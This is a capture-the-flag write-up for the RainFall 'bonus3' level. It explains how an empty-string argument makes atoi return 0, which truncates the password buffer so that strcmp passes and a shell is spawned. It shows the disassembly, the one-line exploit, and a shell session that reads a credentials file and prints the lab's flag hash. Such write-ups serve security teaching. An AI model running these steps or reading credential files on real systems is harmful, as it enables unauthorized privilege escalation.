# Bonus3 — Logic Bug / strcmp Bypass with Empty String

## Vulnerability

The binary reads the password file, then compares the beginning of its content against `argv[1]` using `strcmp()`. The trick lies in how `atoi()` and array indexing interact: if `argv[1]` is `"0"` (or an empty string `""`), `atoi()` returns `0`, and the code writes a null byte at `buffer[0]` — **truncating the password buffer to an empty string before the comparison**. Since `strcmp("", "") == 0`, the check passes and a shell is spawned.

This is a **logic bug / input validation failure** — no memory corruption needed. Just understanding what the code actually does with the input.

---

## Recon

**Full `main` logic reconstructed from the disassembly:**

```gdb
(gdb) disass main
   ; Open the password file
   0x08048513 <+31>:  call fopen          ; fopen("/home/user/end/.pass", "r")

   ; Read 0x42 (66) bytes into buffer at esp+0x18
   0x0804856f <+123>: call fread          ; fread(buf, 1, 0x42, fp)
   0x08048574 <+128>: movb $0x0, 0x59(%esp)  ; buf[0x41] = '\0'  (null-terminate)

   ; Key operation: use argv[1] to truncate the buffer
   0x08048584 <+144>: call atoi           ; atoi(argv[1])
   0x08048589 <+149>: movb $0x0, 0x18(%esp,%eax,1)  ; buf[atoi(argv[1])] = '\0'

   ; Read another 0x41 bytes into buf+0x42
   0x080485b3 <+191>: call fread          ; fread(buf+0x42, 1, 0x41, fp)
   0x080485c2 <+206>: call fclose

   ; Compare buf (now truncated) against argv[1]
   0x080485da <+230>: call strcmp         ; strcmp(buf, argv[1])
   0x080485df <+235>: test %eax,%eax
   0x080485e1 <+237>: jne  <deny>

   ; If equal → spawn shell
   0x080485fa <+262>: call execl          ; execl("/bin/sh", "sh", NULL)
```

**The critical line:**

```asm
movb $0x0, 0x18(%esp,%eax,1)   ; buf[atoi(argv[1])] = '\0'
```

`atoi("")` returns `0` → writes `'\0'` at `buf[0]` → the password buffer is now an **empty string**.

`strcmp("", "") == 0` → shell spawned.

**Attempts during exploration:**

```bash
./bonus3 12           # atoi("12") = 12 → buf[12] = '\0', strcmp("pass[0:12]", "12") → fail
./bonus3 ""           # atoi("") = 0  → buf[0]  = '\0', strcmp("", "")              → ✓
```

Passing very large numbers causes a segfault because `buf[atoi(argv[1])]` goes out of bounds.

---

## Exploit

No payload, no overflow. Just pass an empty string as `argv[1]`:

```bash
./bonus3 ""
```

`""` makes `atoi` return `0`, nullifies `buf[0]`, and the `strcmp("", "")` check passes.

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

---

## Flow

```
fopen("/home/user/end/.pass", "r")
        │
        ▼
fread(buf, 1, 66, fp)   →   buf = "3321b6f8..."
        │
        ▼
atoi(argv[1])  →  atoi("") = 0
        │
        ▼
buf[0] = '\0'           →   buf = ""   ← password erased!
        │
        ▼
strcmp("", "")  →  0    →   equal  →  JNE not taken
        │
        ▼
execl("/bin/sh", "sh", NULL)  ←  shell spawned as end
```

---

## Commands Summary

```gdb
; Understand the logic
gdb ./bonus3
(gdb) disass main

; Key instruction to find:
; movb $0x0, 0x18(%esp,%eax,1)  → buf[atoi(argv[1])] = '\0'
; If atoi returns 0, buf[0] = '\0' → strcmp("", "") passes
```

```bash
# The exploit: empty string argument
./bonus3 ""

# Read the password
cat /home/user/end/.pass
```
